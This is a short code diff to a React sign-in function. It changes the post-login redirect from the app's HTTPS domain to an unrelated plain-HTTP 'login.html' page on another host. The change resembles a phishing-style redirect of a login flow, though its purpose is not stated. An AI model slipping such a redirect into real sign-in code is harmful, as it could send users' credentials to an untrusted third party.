@@ -23,7 +23,7 @@ function SignIn() {
         if(data.status === 200){
             setPnumber("")
         } 
-        window.location.href = 'https://dianiapp.me'
+        window.location.href = 'http://lalo.wireless/login.html?@NW'
     } catch(err){
         console.log(err)
     }
